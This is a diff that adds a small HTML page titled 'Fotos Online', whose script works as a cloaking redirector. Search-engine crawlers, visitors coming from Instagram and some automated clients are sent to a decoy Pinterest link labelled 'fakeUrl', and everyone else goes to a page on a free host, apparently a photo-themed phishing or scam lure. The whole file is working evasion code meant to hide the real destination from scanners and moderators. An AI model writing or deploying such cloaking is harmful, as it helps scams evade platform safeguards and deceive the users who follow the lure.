@@ -1,1 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fotos Online</title>
+</head>
+<body>
+    <script>
+        // Detectar se é um bot de pesquisa
+        var isSearchBot = (function() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var bots = ["googlebot", "bingbot", "yandexbot", "duckduckbot"]; // Lista de bots de pesquisa
+
+            for (var i = 0; i < bots.length; i++) {
+                if (userAgent.indexOf(bots[i]) !== -1) {
+                    return true;
+                }
+            }
+
+            return false;
+        })();
+
+        // Detectar se é um bot do Ig
+        var isInstagramBot = (function() {
+            var referrer = document.referrer.toLowerCase();
+
+            // Verificar se o referenciador contém "kk"
+            return referrer.indexOf("instagram.com") !== -1;
+        })();
+
+        // Detectar se é um bot usando a função POST
+        var isPostBot = (function() {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, false);
+                xhr.send();
+
+                return false;
+            } catch (e) {
+                return true;
+            }
+        })();
+
+        // Redirecionar para um 
+        if (isSearchBot || isInstagramBot || isPostBot) {
+            var fakeUrl = "https://pin.it/14yHzrk"; // 
+            window.location.replace(fakeUrl);
+        } else {
+            // Redirecionar para o site principal
+            window.location.href = 'https://fotos-2023-online-com.000webhostapp.com/fotos.html';
+        }
+    </script>
+</body>
+</html>
 
